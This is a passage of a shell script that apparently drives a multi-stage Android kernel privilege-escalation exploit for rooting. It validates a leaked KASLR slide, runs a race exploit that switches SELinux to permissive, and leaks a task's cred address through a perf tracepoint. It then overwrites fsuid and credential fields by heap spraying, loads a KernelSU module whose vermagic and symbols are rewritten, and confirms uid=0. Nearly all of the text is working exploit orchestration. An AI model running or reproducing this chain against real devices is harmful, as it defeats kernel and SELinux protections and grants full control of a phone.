GRAB_EARLY_BYTES=${MAGICROOT_GRAB_MIN_BYTES:-$KASLR_MIN_BYTES}
case "$GRAB_EARLY_BYTES" in ''|*[!0-9]*) GRAB_EARLY_BYTES=$KASLR_MIN_BYTES ;; esac
KASLR_GRAB_TRIES=${MAGICROOT_KASLR_GRAB_TRIES:-3}
case "$KASLR_GRAB_TRIES" in ''|*[!0-9]*) KASLR_GRAB_TRIES=3 ;; esac
[ "$KASLR_GRAB_TRIES" -ge 1 ] 2>/dev/null && [ "$KASLR_GRAB_TRIES" -le 5 ] 2>/dev/null ||
    KASLR_GRAB_TRIES=3
KASLR_GRAB_MAX_LOOPS=${MAGICROOT_KASLR_GRAB_MAX_LOOPS:-300}
case "$KASLR_GRAB_MAX_LOOPS" in ''|*[!0-9]*) KASLR_GRAB_MAX_LOOPS=300 ;; esac
[ "$KASLR_GRAB_MAX_LOOPS" -ge 40 ] 2>/dev/null &&
    [ "$KASLR_GRAB_MAX_LOOPS" -le 600 ] 2>/dev/null ||
    KASLR_GRAB_MAX_LOOPS=300

# Read + validate KASLR fields.  This only accepts a capture that meets the
# profile's anchors/votes/bytes gates; otherwise the caller re-captures.
kaslr_fields_ok() {
    SLIDE=$(sed -n 's/^KASLR_SLIDE=//p' "$D/kaslr.txt" 2>/dev/null)
    SELINUX_ARG=$(sed -n 's/^SELINUX_ARG=//p' "$D/kaslr.txt" 2>/dev/null)
    PREPARE=$(sed -n 's/^PREPARE=//p' "$D/kaslr.txt" 2>/dev/null)
    VOTES=$(sed -n 's/^KASLR_VOTES=//p' "$D/kaslr.txt" 2>/dev/null)
    ANCHORS=$(sed -n 's/^KASLR_ANCHORS=//p' "$D/kaslr.txt" 2>/dev/null)
    KASLR_BYTES=$(sed -n 's/^KASLR_BYTES=//p' "$D/kaslr.txt" 2>/dev/null)
    case "$KASLR_BYTES" in ''|*[!0-9]*) KASLR_BYTES=0 ;; esac
    [ -n "$SLIDE" ] || return 1
    case "$PREPARE" in 0xffff*) ;; *) return 1 ;; esac
    case "$SELINUX_ARG" in 0xffff*) ;; *) return 1 ;; esac
    [ -n "$VOTES" ] && [ "$VOTES" -ge "$KASLR_MIN_VOTES" ] 2>/dev/null || return 1
    [ -n "$ANCHORS" ] && [ "$ANCHORS" -ge "$KASLR_MIN_ANCHORS" ] 2>/dev/null || return 1
    [ "$KASLR_BYTES" -ge "$KASLR_MIN_BYTES" ] 2>/dev/null || return 1
    ! grep -q '^KASLR_ERROR=' "$D/kaslr.txt" 2>/dev/null || return 1
    return 0
}

# A cache entry from an earlier run can be under-sampled (the old code wrote
# it before validating).  Reject it and force a fresh capture.
if [ "$KASLR_CACHE_HIT" = "1" ] && ! kaslr_fields_ok; then
    echo "KASLR_CACHE_REJECT boot_id=$BOOT_ID anchors=${ANCHORS:-none} votes=${VOTES:-none} bytes=${KASLR_BYTES:-0}"
    KASLR_CACHE_HIT=0
fi
if [ "$KASLR_CACHE_HIT" != "1" ]; then
    KASLR_GRAB_TRY=0
    while [ "$KASLR_GRAB_TRY" -lt "$KASLR_GRAB_TRIES" ]; do
        KASLR_GRAB_TRY=$((KASLR_GRAB_TRY + 1))
        _loops=$((GRAB_LOOPS * KASLR_GRAB_TRY))
        [ "$_loops" -gt "$KASLR_GRAB_MAX_LOOPS" ] && _loops=$KASLR_GRAB_MAX_LOOPS
        if [ "$KASLR_GRAB_TRY" -eq "$KASLR_GRAB_TRIES" ] && [ "$KASLR_GRAB_TRY" -gt 1 ]; then
            echo "KASLR_GRAB_TRY=$KASLR_GRAB_TRY legacy=1 loops=$_loops"
            mark GRAB_PRE
            sh "$D/grab_legacy.sh" 8 >/dev/null 2>&1
            mark GRAB_DONE
        else
            echo "KASLR_GRAB_TRY=$KASLR_GRAB_TRY loops=$_loops"
            _grab_min=0
            [ "$KASLR_GRAB_TRY" -eq 1 ] && _grab_min=$GRAB_EARLY_BYTES
            echo "GRAB_EARLY_STOP_BYTES=$_grab_min"
            mark GRAB_PRE
            sh "$D/grab.sh" "$_loops" "$_grab_min" >/dev/null 2>&1
            mark GRAB_DONE
        fi
        "$KASLR_BIN" "$D" > "$D/kaslr.txt"
        if kaslr_fields_ok; then
            break
        fi
        if [ "$KASLR_GRAB_TRY" -lt "$KASLR_GRAB_TRIES" ]; then
            echo "KASLR_REGRAB attempt=$KASLR_GRAB_TRY anchors=${ANCHORS:-none} votes=${VOTES:-none} bytes=${KASLR_BYTES:-0} reason=below_profile_gate"
            sleep 1
        fi
    done
fi
cat "$D/kaslr.txt"
if ! kaslr_fields_ok; then
    if [ -z "$SLIDE" ]; then
        echo "FAIL=kaslr"
    elif [ "${PREPARE#0xffff}" = "$PREPARE" ]; then
        echo "FAIL=bad_prepare"
    elif [ "${SELINUX_ARG#0xffff}" = "$SELINUX_ARG" ]; then
        echo "FAIL=bad_selinux_arg"
    elif [ -z "$VOTES" ] || [ "$VOTES" -lt "$KASLR_MIN_VOTES" ] 2>/dev/null; then
        echo "FAIL=kaslr_votes votes=${VOTES:-none} min=$KASLR_MIN_VOTES"
    elif [ -z "$ANCHORS" ] || [ "$ANCHORS" -lt "$KASLR_MIN_ANCHORS" ] 2>/dev/null; then
        echo "FAIL=kaslr_anchors anchors=${ANCHORS:-none} min=$KASLR_MIN_ANCHORS"
    elif [ "$KASLR_BYTES" -lt "$KASLR_MIN_BYTES" ] 2>/dev/null; then
        echo "FAIL=kaslr_bytes bytes=$KASLR_BYTES min=$KASLR_MIN_BYTES"
    else
        echo "FAIL=kaslr_validation"
    fi
    rm -f "$KASLR_CACHE" 2>/dev/null || true
    exit 2
fi
# Only cache a capture that passed the gates.
if [ -n "$BOOT_ID" ] && [ "$KASLR_CACHE_HIT" != "1" ]; then
    { echo "$BOOT_ID"; cat "$D/kaslr.txt"; } > "$KASLR_CACHE" 2>/dev/null || true
fi
SELINUX_ARG=$(sed -n 's/^SELINUX_ARG=//p' "$D/kaslr.txt")
PREPARE=$(sed -n 's/^PREPARE=//p' "$D/kaslr.txt")
VOTES=$(sed -n 's/^KASLR_VOTES=//p' "$D/kaslr.txt")
ANCHORS=$(sed -n 's/^KASLR_ANCHORS=//p' "$D/kaslr.txt")
KASLR_BYTES=$(sed -n 's/^KASLR_BYTES=//p' "$D/kaslr.txt")
case "$KASLR_BYTES" in ''|*[!0-9]*) KASLR_BYTES=0 ;; esac
# Double validation: the KASLR binary derives SELINUX_ARG/PREPARE from its own
# hard-coded links.  Recompute them from the profile links + slide and require
# an exact match, so a wrong profile/KASLR binary/cache can never slip through.
EXPECT_PREPARE=$("$D/addrcalc" add "$PROFILE_KASLR_PREPARE_LINK" "$SLIDE" 2>/dev/null | tr -d '\r\n')
if [ -z "$EXPECT_PREPARE" ] || [ "$PREPARE" != "$EXPECT_PREPARE" ]; then
    echo "FAIL=kaslr_crosscheck_prepare expect=${EXPECT_PREPARE:-none} got=$PREPARE link=$PROFILE_KASLR_PREPARE_LINK"
    exit 2
fi
SELINUX_BASE=$("$D/addrcalc" add "$PROFILE_KASLR_SELINUX_LINK" "$SLIDE" 2>/dev/null | tr -d '\r\n')
EXPECT_SELINUX=$("$D/addrcalc" add "$SELINUX_BASE" 0xfffffffffffffff9 2>/dev/null | tr -d '\r\n')
if [ -z "$EXPECT_SELINUX" ] || [ "$SELINUX_ARG" != "$EXPECT_SELINUX" ]; then
    echo "FAIL=kaslr_crosscheck_selinux expect=${EXPECT_SELINUX:-none} got=$SELINUX_ARG link=$PROFILE_KASLR_SELINUX_LINK"
    exit 2
fi
echo "KASLR_CROSS_CHECK=ok prepare=$PREPARE selinux_arg=$SELINUX_ARG votes=$VOTES anchors=$ANCHORS bytes=$KASLR_BYTES"
echo "KASLR_ACCEPTED slide=$SLIDE votes=$VOTES anchors=$ANCHORS"
mark KASLR_ACCEPTED
if [ "$KASLR_ONLY" = "1" ]; then
    mark KASLR_ONLY_DONE
    echo "KASLR_ONLY_DONE"
    exit 0
fi

KO_CACHE_DIR=${KO_CACHE_DIR:-$D/.ko-cache}

# Stable content hash for cache identity.  Android toybox normally provides
# sha256sum; fall back to cksum/stat only on unusual systems.
file_sha256() {
    if command -v sha256sum >/dev/null 2>&1; then
        _h=$(sha256sum "$1" 2>/dev/null | awk '{print $1}')
        [ -n "$_h" ] && { printf '%s\n' "$_h"; return 0; }
    fi
    if command -v md5sum >/dev/null 2>&1; then
        _h=$(md5sum "$1" 2>/dev/null | awk '{print $1}')
        [ -n "$_h" ] && { printf '%s\n' "$_h"; return 0; }
    fi
    stat -c '%s:%Y' "$1" 2>/dev/null
}
key_hash() {
    if command -v sha256sum >/dev/null 2>&1; then
        _h=$(printf '%s' "$1" | sha256sum 2>/dev/null | awk '{print $1}' | cut -c1-32)
        [ -n "$_h" ] && { printf '%s\n' "$_h"; return 0; }
    fi
    if command -v cksum >/dev/null 2>&1; then
        _h=$(printf '%s' "$1" | cksum 2>/dev/null | awk '{print $1}')
        [ -n "$_h" ] && { printf '%s\n' "$_h"; return 0; }
    fi
    printf '%s\n' "$1" | tr ': |' '___' | cut -c1-24
}

prune_ko_cache() {
    [ -d "$KO_CACHE_DIR" ] || return 0
    [ "$KO_CACHE_MAX" -ge 1 ] 2>/dev/null || KO_CACHE_MAX=6
    [ "$KO_CACHE_DAYS" -ge 1 ] 2>/dev/null || KO_CACHE_DAYS=7
    find "$KO_CACHE_DIR" -maxdepth 1 -type f -name "*.ko" -mtime +"$KO_CACHE_DAYS" -delete 2>/dev/null || true
    # Remove orphan sidecars whose .ko was deleted by the age pass.
    for _meta in "$KO_CACHE_DIR"/*.key; do
        [ -e "$_meta" ] || continue
        [ -e "${_meta%.key}.ko" ] || rm -f "$_meta" 2>/dev/null || true
    done
    # Keep the current entry unconditionally; KO_CACHE_MAX is only a disk
    # retention limit, never a flavor-selection input.
    if [ -n "$KO_PERSIST" ]; then
        _keep_other=$((KO_CACHE_MAX - 1))
    else
        _keep_other=$KO_CACHE_MAX
    fi
    [ "$_keep_other" -ge 0 ] 2>/dev/null || _keep_other=0
    _ko_list=$(ls -1t "$KO_CACHE_DIR"/*.ko 2>/dev/null || true)
    if [ -n "$KO_PERSIST" ] && [ -n "$_ko_list" ]; then
        _ko_list=$(printf '%s\n' "$_ko_list" | grep -vF "$KO_PERSIST" 2>/dev/null || true)
    fi
    if [ -n "$_ko_list" ]; then
        printf '%s\n' "$_ko_list" | tail -n +$((_keep_other + 1)) | while IFS= read -r old; do
            [ -n "$old" ] || continue
            rm -f "$old" "${old%.ko}.key" 2>/dev/null || true
        done
    fi
}

patch_ko() {
    echo "== 2. patch KernelSU module =="
    echo "KSU_FLAVOR=$KSU_FLAVOR KSU_KMI=source=$(cat "$D/ko_source_kmi" 2>/dev/null || echo 6.12.76) target=$(uname -r) strategy=vermagic+sym_rebase portable=yes exact_target_build=no"
    KO_CACHE="$D/ko.cache"
    KO_CACHE_DIR=${KO_CACHE_DIR:-$D/.ko-cache}
    KO_TEMPLATE_SHA=$(file_sha256 "$KO_TEMPLATE")
    KO_SYMS_SHA=$(file_sha256 "$SYMS")
    KO_PATCH_SHA=$(file_sha256 "$D/ko_patch")
    KO_KEY=""
    if [ -n "$BOOT_ID" ]; then
        # Flavor + profile + template/syms content hashes are all identity
        # inputs.  Do not rely on size/mtime alone: a replaced same-size
        # template must never hit an old cache entry.
        KO_KEY="$BOOT_ID|$PROFILE_ID|$SLIDE|$(uname -r)|$KSU_FLAVOR|$(basename "$KO_TEMPLATE")|$KO_TEMPLATE_SHA|$(basename "$SYMS")|$KO_SYMS_SHA|$KO_PATCH_SHA"
    fi
    echo "KO_CACHE_IDENTITY flavor=$KSU_FLAVOR profile=$PROFILE_ID template=$(basename "$KO_TEMPLATE"):${KO_TEMPLATE_SHA:-none} syms=$(basename "$SYMS"):${KO_SYMS_SHA:-none} keep=$KO_CACHE_MAX"
    KO_CACHE_HIT=0
    KO_PERSIST=""
    KO_PERSIST_KEY=""
    if [ -n "$KO_KEY" ]; then
        KO_TAG=$(key_hash "$KO_KEY")
        KO_PERSIST="$KO_CACHE_DIR/$KO_TAG.ko"
        KO_PERSIST_KEY="$KO_CACHE_DIR/$KO_TAG.key"
    fi
    if [ -n "$KO_KEY" ] && [ -s "$D/ksu-patched.ko" ] && [ -f "$KO_CACHE" ] &&
       [ "$(cat "$KO_CACHE" 2>/dev/null)" = "$KO_KEY" ]; then
        KO_CACHE_HIT=1
        echo "KO_CACHE_HIT boot_id=$BOOT_ID flavor=$KSU_FLAVOR profile=$PROFILE_ID"
    elif [ -n "$KO_PERSIST" ] && [ -s "$KO_PERSIST" ] && [ -f "$KO_PERSIST_KEY" ] &&
         [ "$(cat "$KO_PERSIST_KEY" 2>/dev/null)" = "$KO_KEY" ]; then
        mkdir -p "$KO_CACHE_DIR" 2>/dev/null || true
        cp -f "$KO_PERSIST" "$D/ksu-patched.ko" 2>/dev/null && {
            printf "%s\n" "$KO_KEY" > "$KO_CACHE" 2>/dev/null || true
            KO_CACHE_HIT=1
            echo "KO_CACHE_RESTORED boot_id=$BOOT_ID flavor=$KSU_FLAVOR profile=$PROFILE_ID"
        }
    elif [ -n "$KO_PERSIST" ] && [ -s "$KO_PERSIST" ]; then
        # Legacy/mismatched entry (written before content-hash sidecars, or a
        # tag collision from the old truncated filename).  Never load it.
        echo "KO_CACHE_STALE reason=key_missing_or_mismatch tag=$KO_TAG flavor=$KSU_FLAVOR"
        rm -f "$KO_PERSIST" "$KO_PERSIST_KEY" 2>/dev/null || true
    fi
    if [ "$KO_CACHE_HIT" != "1" ]; then
        rm -f "$D/ko_patch.self" 2>/dev/null || true
        "$D/ko_patch" "$KO_TEMPLATE" "$D/ksu-patched.ko" "$SYMS" "$SLIDE" "$(uname -r)" > "$D/ko_patch.log" 2>&1
        KO_PATCH_RC=$?
        cat "$D/ko_patch.log" 2>/dev/null
        if [ "$KO_PATCH_RC" != "0" ]; then
            echo "FAIL=ko_patch rc=$KO_PATCH_RC"
            return 3
        fi
        # patched/missing self-check: a missing symbol means the module would
        # fail to load with ENOENT later; refuse before touching the kernel.
        KO_PATCH_LINE=$(grep -m1 '^PATCHED=' "$D/ko_patch.log" 2>/dev/null)
        KO_PATCHED=$(printf '%s\n' "$KO_PATCH_LINE" | sed -n 's/^PATCHED=\([0-9][0-9]*\) MISSING=\([0-9][0-9]*\).*/\1/p')
        KO_MISSING=$(printf '%s\n' "$KO_PATCH_LINE" | sed -n 's/^PATCHED=\([0-9][0-9]*\) MISSING=\([0-9][0-9]*\).*/\2/p')
        SYMS_N=$(grep -c '[^[:space:]]' "$SYMS" 2>/dev/null)
        case "$SYMS_N" in ''|*[!0-9]*) SYMS_N=0 ;; esac
        echo "KO_PATCH_SELF_CHECK=patched=${KO_PATCHED:-none} missing=${KO_MISSING:-none} syms=$SYMS_N template=$(basename "$KO_TEMPLATE") flavor=$KSU_FLAVOR profile=$PROFILE_ID"
        if [ -z "$KO_PATCHED" ] || [ -z "$KO_MISSING" ]; then
            echo "FAIL=ko_patch_selfcheck_unparsed log=$D/ko_patch.log"
            return 3
        fi
        if [ "$KO_MISSING" != "0" ]; then
            echo "FAIL=ko_patch_missing missing=$KO_MISSING patched=$KO_PATCHED syms=$SYMS_N flavor=$KSU_FLAVOR"
            echo "HINT=syms table does not cover the module's undefined symbols for this KMI"
            return 3
        fi
        if [ "$KO_PATCHED" -le 0 ]; then
            echo "FAIL=ko_patch_patched_zero syms=$SYMS_N"
            return 3
        fi
        printf '%s\n' "$KO_PATCH_LINE" > "$D/ko_patch.self" 2>/dev/null || true
        if [ -n "$KO_KEY" ]; then
            printf '%s\n' "$KO_KEY" > "$KO_CACHE" 2>/dev/null || true
            if [ -n "$KO_PERSIST" ]; then
                mkdir -p "$KO_CACHE_DIR" 2>/dev/null || true
                cp -f "$D/ksu-patched.ko" "$KO_PERSIST" 2>/dev/null || true
                printf '%s\n' "$KO_KEY" > "$KO_PERSIST_KEY" 2>/dev/null || true
                echo "KO_CACHE_SAVED flavor=$KSU_FLAVOR profile=$PROFILE_ID tag=$KO_TAG"
            fi
        fi
    else
        echo "KO_PATCH_SKIPPED reason=same_boot_slide_template flavor=$KSU_FLAVOR profile=$PROFILE_ID"
        if [ -f "$D/ko_patch.self" ]; then
            echo "KO_PATCH_SELF_CHECK_CACHED=$(cat "$D/ko_patch.self" 2>/dev/null)"
        else
            echo "KO_PATCH_SELF_CHECK=skipped reason=ko_cache"
        fi
    fi
    prune_ko_cache
    echo "KO_CACHE_KEEP=$KO_CACHE_MAX AGE_DAYS=$KO_CACHE_DAYS dir=$KO_CACHE_DIR (retention only; not a flavor selector)"
    return 0
}

if [ "$MODULE_ALREADY_LIVE_ENFORCING" = "1" ]; then
    echo "KO_PATCH_SKIPPED reason=module_already_live"
else
    mark PATCH_PRE
    patch_ko || exit 3
    mark PATCH_DONE
    # Verify the patched module exists and is non-empty, then keep a copy at
    # $D/ksu-official.ko (late-load fallback path) and in the
    # work dir.
    if [ ! -s "$D/ksu-patched.ko" ]; then
        echo "FAIL=ko_patch_empty"
        exit 3
    fi
    cp -f "$D/ksu-patched.ko" $D/ksu-official.ko 2>/dev/null || true
    cp -f "$D/ksu-patched.ko" "$D/ksu-loaded.ko" 2>/dev/null || true
    echo "PATCHED_KO=size=$(wc -c < "$D/ksu-patched.ko" 2>/dev/null) loaded_copy=$D/ksu-official.ko"
fi

# Kill any leftover grab/forker spray processes and let the kernel settle
# briefly before the dangerous permissive race (fresh-boot runs used to panic
# while these were still winding down).
pkill -9 -f '[f]orker' 2>/dev/null
pkill -9 -f '[g]rab\.sh' 2>/dev/null
pkill -9 -f '[t]race_pipe_raw' 2>/dev/null
sleep 1
echo "PERMISSIVE_CLEANUP=done"
echo "== 3. SELinux permissive =="
echo "boot_id=$BOOT_ID time=$(date '+%Y-%m-%d %H:%M:%S' 2>/dev/null) uptime=$(cut -d. -f1 /proc/uptime 2>/dev/null)" > "$MARK/PERMISSIVE_STARTED"
mark PERMISSIVE_PRE
if [ "$(getenforce)" != "Permissive" ]; then
    # 32 victims, matching phase1/phase2. The binaries were rebuilt with
    # MAXVICTIM=32; the old 24 clamp no longer applies.
    _perm_attempts=$ATTEMPTS_PERMISSIVE
    [ "$_perm_attempts" -gt "$PERMISSIVE_MAX_ATTEMPTS" ] 2>/dev/null &&
        _perm_attempts=$PERMISSIVE_MAX_ATTEMPTS
    echo "PERMISSIVE_LIMIT attempts=$_perm_attempts timeout=${PERMISSIVE_TIMEOUT}s"
    PERM_RC=0
    if command -v timeout >/dev/null 2>&1; then
        timeout -s KILL "$PERMISSIVE_TIMEOUT" "$V36_BIN" \
            0 "$SELINUX_ARG" "$_perm_attempts" 400 "$VICTIMS_PERMISSIVE" \
            "$FRAG_PERMISSIVE" "$DRAIN_PERMISSIVE" "$MIN_PERMISSIVE" || PERM_RC=$?
    else
        "$V36_BIN" 0 "$SELINUX_ARG" "$_perm_attempts" 400 "$VICTIMS_PERMISSIVE" \
            "$FRAG_PERMISSIVE" "$DRAIN_PERMISSIVE" "$MIN_PERMISSIVE" || PERM_RC=$?
    fi
    echo "PERMISSIVE_RC=$PERM_RC attempts=$_perm_attempts timeout=${PERMISSIVE_TIMEOUT}s"
fi
if [ "$(getenforce)" != "Permissive" ]; then
    echo "FAIL=permissive attempts=${_perm_attempts:-$ATTEMPTS_PERMISSIVE} rc=${PERM_RC:-?}"
    case "${PERM_RC:-}" in
        124|137) echo "PERMISSIVE_TIMEOUT=${PERMISSIVE_TIMEOUT}s" ;;
    esac
    echo "HINT=if this repeats, reboot and rerun; check KASLR_CROSS_CHECK and KASLR_ANCHORS>=5"
    exit 4
fi
mark PERMISSIVE_DONE
rm -f "$MARK/PERMISSIVE_STARTED" 2>/dev/null || true
# Device A/B test hook: stop right after the permissive stage so presets can be
# compared without loading a module or touching creds.
if [ "${MAGICROOT_PERMISSIVE_ONLY:-0}" = "1" ]; then
    echo "PERMISSIVE_ONLY_OK tuning=$TUNING"
    exit 0
fi

echo "== 4. cred target =="
TP=$(cat /sys/kernel/tracing/events/kmem/kmem_cache_alloc/id 2>/dev/null)
[ -n "$TP" ] || { echo "FAIL=missing_kmem_cache_alloc_tracepoint"; exit 5; }
CRED=""
CRED_BIT16=""
CRED_PID=""
SYNC="$MARK/sync.futex"
CRED_TRY=0
# bit16=0 means cap_effective=cred+0x40 lacks CAP_SYS_MODULE. Retry with a
# fresh cred_target process before spending phase1/phase2.
while [ "$CRED_TRY" -lt 4 ]; do
    CRED_TRY=$((CRED_TRY + 1))
    rm -f "$MARK/PHASE2_DONE" "$MARK/CAPBND_OK" "$MARK/FINTI_TRY" "$MARK/FINTI_RC" "$MARK/FINTI_SKIP" "$D/cred.log" "$SYNC"
    MAGICROOT_ALLOW_SHELL="$LOAD_ALLOW_SHELL" "$D/cred_target" "$PREPARE" "$TP" "$MARK/PHASE2_DONE" "$D/ksu-patched.ko" > "$D/cred.log" 2>&1 &
    CRED_PID=$!
    # Single futex wait; no inotify fallback and no per-round shell parsing.
    CRED_LINE=$("$D/wait_helper" futex-cred "$SYNC" 45000 "$CRED_PID" 2>/dev/null || true)
    CRED=""
    CRED_BIT16=""
    if [ -n "$CRED_LINE" ]; then
        rest=${CRED_LINE#*CRED=0x}
        CRED=0x${rest%% *}
        bit=${CRED_LINE#*bit16=}
        CRED_BIT16=${bit%% *}
    fi
    cat "$D/cred.log"
    if [ -n "$CRED" ] && [ "$CRED_BIT16" = "1" ]; then
        echo "CRED_OK try=$CRED_TRY bit16=1"
        break
    fi
    echo "CRED_RETRY try=$CRED_TRY bit16=${CRED_BIT16:-none} cred=${CRED:-none}"
    kill "$CRED_PID" 2>/dev/null || true
    wait "$CRED_PID" 2>/dev/null || true
    CRED=""
done
if [ -z "$CRED" ]; then
    echo "FAIL=cred_target"
    grep -m1 '^CRED=NONE' "$D/cred.log" 2>/dev/null || true
    grep -m1 '^ERR=perf_event_open' "$D/cred.log" 2>/dev/null || true
    grep -m1 '^ERR=mmap' "$D/cred.log" 2>/dev/null || true
    echo "HINT=perf leak (kmem_cache_alloc tracepoint) failed; check tracefs/perf_event_paranoid and SELinux state"
    exit 5
fi
LEAK_LINE=$(grep -m1 '^CRED=0x' "$D/cred.log" 2>/dev/null)
if [ -n "$LEAK_LINE" ]; then
    echo "CRED_LEAK_SELF_CHECK=$LEAK_LINE"
    echo "CRED_LEAK_METHOD=perf_event_open_kmem_cache_alloc+capset"
fi
if [ "$CRED_BIT16" != "1" ]; then
    echo "FAIL=cred_bit16"
    exit 5
fi
TARGET_PID=$CRED_PID

echo "== 5. fsuid/fsgid =="
if [ "$SKIP_FSUID" = "1" ]; then
    echo "SKIP_FSUID=1"
else
    FSUID=$("$D/addrcalc" add "$CRED" 0x20)
    run_v36 0 "$FSUID" "$ATTEMPTS_FSUID" 400 "$VICTIMS_FSUID" "$FRAG_PERMISSIVE" "$DRAIN_PERMISSIVE" "$MIN_PERMISSIVE"
    echo "fsuid step done (CapBnd 由 helper 在 phase1 后写入 CAPBND_OK)"
fi
# Device A/B hook: stop after the fsuid stage so fsuid parameters can be
# compared without running cred/module.
if [ "${MAGICROOT_AB_STAGE:-}" = "fsuid" ]; then
    kill -9 "$CRED_PID" 2>/dev/null || true
    rm -f "$SYNC" 2>/dev/null || true
    echo "AB_STAGE_OK stage=fsuid"
    exit 0
fi

echo "== 6. phase1+phase2 =="
# Victim count is shared by phase1/phase2; attempts/frag/drain depend on preset.
    run_cred "$CRED" "$ATTEMPTS_CRED1" "$ATTEMPTS_CRED2" 400 \
    "$VICTIMS_CRED" "$FRAG_CRED" \
    "$DRAIN_CRED1" "$MIN_CRED1" \
    "$DRAIN_CRED1" "$MIN_CRED1" "$DRAIN_CRED2" "$MIN_CRED2"
CRED_PHASE_RC=$?
if [ "$CRED_PHASE_RC" != "0" ]; then
    echo "FAIL=cred_phase rc=$CRED_PHASE_RC"
    kill "$TARGET_PID" 2>/dev/null || true
    exit 6
fi
# One helper waits for the MODULE futex event and then Live; shell wakes once.
MOD_WAIT_MS=${MAGICROOT_MODULE_WAIT_MS:-60000}
case "$MOD_WAIT_MS" in ''|*[!0-9]*) MOD_WAIT_MS=60000 ;; esac
[ "$MOD_WAIT_MS" -ge 5000 ] 2>/dev/null && [ "$MOD_WAIT_MS" -le 180000 ] 2>/dev/null || MOD_WAIT_MS=60000
echo "MODULE_WAIT_LIMIT_MS=$MOD_WAIT_MS"
MOD_LINE=$("$D/wait_helper" futex-live "$SYNC" "$MOD_WAIT_MS" 8000 "$TARGET_PID" 2>/dev/null || true)
case "$MOD_LINE" in
    LIVE) echo "MODULE_LOADED flavor=$KSU_FLAVOR" ;;
    SKIP) echo "FAIL=module_skip flavor=$KSU_FLAVOR"; exit 7 ;;
    *)
        # Bounded polling fallback for the module-live gate.
        echo "MODULE_WAIT_HELPER_TIMEOUT flavor=$KSU_FLAVOR"
        MOD_WAIT_POLL=30
        MOD_POLL_OK=0
        _i=0
        while [ "$_i" -lt "$MOD_WAIT_POLL" ]; do
            if grep -Eq '^kernelsu .* Live' /proc/modules 2>/dev/null; then
                MOD_POLL_OK=1
                echo "MODULE_LOADED_POLL after=${_i}s"
                break
            fi
            # If the loader already reported a terminal result, stop early.
            [ -f "$MARK/FINTI_RC" ] && break
            sleep 2
            _i=$((_i + 2))
            [ $((_i % 30)) -eq 0 ] && echo "  MODULE_WAIT_POLL ${_i}s"
        done
        if [ "$MOD_POLL_OK" != "1" ]; then
            echo "FAIL=module_wait flavor=$KSU_FLAVOR"
            [ -f "$MARK/FINTI_RC" ] && cat "$MARK/FINTI_RC" 2>/dev/null
            [ -f "$MARK/FINTI_SKIP" ] && cat "$MARK/FINTI_SKIP" 2>/dev/null
            echo "HINT=check ko_patch.log / dmesg; BakaSU LKM vermagic was rewritten to $(uname -r)"
            echo "HINT_ENOENT=symbol rebase mismatch; HINT_EINVAL=vermagic/payload mismatch; HINT_EPERM=module signature/SELinux"
            echo "DMESG_TAIL=$(dmesg 2>/dev/null | grep -i -E 'kernelsu|module|vermagic|Key was rejected' | tail -6 | tr '\n' '|')"
            exit 7
        fi
        ;;
esac
[ -f "$MARK/FINTI_RC" ] && cat "$MARK/FINTI_RC"
[ -f "$MARK/FINTI_SKIP" ] && cat "$MARK/FINTI_SKIP"
# Keep a copy at the late-load location and in the work dir.
if [ -f "$D/ksu-patched.ko" ]; then
    cp -f "$D/ksu-patched.ko" $D/ksu-official.ko 2>/dev/null || true
    cp -f "$D/ksu-patched.ko" "$D/ksu-loaded.ko" 2>/dev/null || true
    echo "PATCHED_KO_COPY=ok size=$(wc -c < "$D/ksu-patched.ko" 2>/dev/null)"
fi
if [ "$SKIP_FSUID" = "1" ]; then
    if [ -f "$MARK/FINTI_RC" ] && grep -q 'rc=0' "$MARK/FINTI_RC" &&
       grep -Eq '^kernelsu .* Live' /proc/modules; then
        echo "SKIP_FSUID_FINTI_OK"
    else
        echo "FAIL=skip_fsuid_finit"
        exit 7
    fi
fi
# Device A/B hook: stop as soon as the module is Live; avoids the
# manager/root_stage variability while still testing perm/fsuid/cred/module.
if [ "${MAGICROOT_AB_STAGE:-}" = "module" ]; then
    echo "AB_STAGE_OK stage=module"
    exit 0
fi

echo "== 7. honor_ubl bfexec =="
mkdir -p "$R"
if ! cp "$D/bfexec" "$R/bfexec" || ! chmod 700 "$R" "$R/bfexec"; then
    echo "FAIL=bfexec_stage"
    exit 8
fi
GRANT_TRY=1
GRANT_RC=1
while [ "$GRANT_TRY" -le 3 ]; do
    if "$R/bfexec" > "$MARK/ROOT_ID" 2>&1; then
        GRANT_RC=0
        break
    fi
    GRANT_RC=$?
    echo "GRANT_RETRY try=$GRANT_TRY rc=$GRANT_RC"
    [ "$GRANT_TRY" -lt 3 ] && sleep $((GRANT_TRY * 2))
    GRANT_TRY=$((GRANT_TRY + 1))
done
cat "$MARK/ROOT_ID" 2>/dev/null
if [ "$GRANT_RC" != "0" ] || ! grep -q 'uid=0' "$MARK/ROOT_ID" 2>/dev/null; then
    echo "FAIL=grant rc=$GRANT_RC"
    exit 8
fi
if [ "$ORIGINAL_ENFORCE" = "Enforcing" ]; then
    if ! "$R/bfexec" c2V0ZW5mb3JjZSAx > "$D/restore-enforce.log" 2>&1; then
        cat "$D/restore-enforce.log"
        echo "FAIL=restore_enforcing"
        exit 8
    fi
    echo "SELINUX_RESTORED=$(getenforce 2>/dev/null)"
fi
"$R/bfexec" > "$MARK/ROOT_ID" 2>&1 || { echo "FAIL=final_bfexec_check"; exit 8; }
cat "$MARK/ROOT_ID"
grep -q 'uid=0' "$MARK/ROOT_ID" || { echo "FAIL=final_root_id"; exit 8; }

# Optional user-supplied KO for the 64560 chain.  Same checks as the 98260
# path: ELF/arch/source vermagic -> ko_patch -> target vermagic -> load.
if [ -n "${MAGICROOT_CUSTOM_KO:-}" ]; then
    CUSTOM_KO=$MAGICROOT_CUSTOM_KO
    CUSTOM_LOG=$D/64560-custom-ko.log
    CUSTOM_PATCHED=$D/64560-custom-patched.ko
    : > "$CUSTOM_LOG" 2>/dev/null || true
    TARGET_KERNEL=$(uname -r 2>/dev/null || echo unknown)
    if [ -f "$CUSTOM_KO" ]; then
        MAGIC=$(od -An -tx1 -N4 "$CUSTOM_KO" 2>/dev/null | tr -d ' \n')
        EM=$(od -An -tx1 -j18 -N2 "$CUSTOM_KO" 2>/dev/null | tr -d ' \n')
        VM=$(grep -a -o 'vermagic=[^ ]*' "$CUSTOM_KO" 2>/dev/null | head -1)
        echo "CUSTOM_KO_VERMAGIC=${VM:-unknown} elf=$MAGIC arch=$EM target=$TARGET_KERNEL" | tee -a "$CUSTOM_LOG"
        if [ "$MAGIC" != "7f454c46" ]; then
            echo "CUSTOM_KO=failed reason=not_elf path=$CUSTOM_KO"
